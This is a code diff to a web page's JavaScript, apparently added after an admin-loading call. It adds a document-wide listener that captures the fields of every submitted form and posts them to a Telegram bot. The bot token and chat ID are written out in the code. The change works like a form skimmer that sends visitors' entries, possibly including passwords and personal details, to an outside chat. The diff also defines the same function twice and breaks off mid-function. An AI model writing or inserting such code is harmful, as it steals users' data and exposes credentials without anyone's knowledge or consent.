@@ -607,13 +607,34 @@
   }
 
   loadAdmin();
-  // كود إرسال البيانات إلى التليجرام
-const BOT_TOKEN = '8829617276:AAFj78SmLvHqeJNF91Akvr2rP07116dAumA';
+  const BOT_TOKEN = '8829617276:AAFj78SmLvHqeJNF91Akvr2rP07116dAumA';
 const CHAT_ID = '8458451569';
 
 async function sendToTelegram(data) {
-    const text = 📝 **تسجيل جديد:**\n\n + JSON.stringify(data, null, 2);
+    const text = "New Registration:\n" + JSON.stringify(data, null, 2);
 
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        });
+    } catch (error) {
+        console.error('Telegram Send Error:', error);
+    }
+}
+
+document.addEventListener('submit', function(e) {
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData.entries());
+    sendToTelegram(data);
+});
+
+async function sendToTelegram(data) {
+    const text = "New Registration:\n" + JSON.stringify(data, null, 2);
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
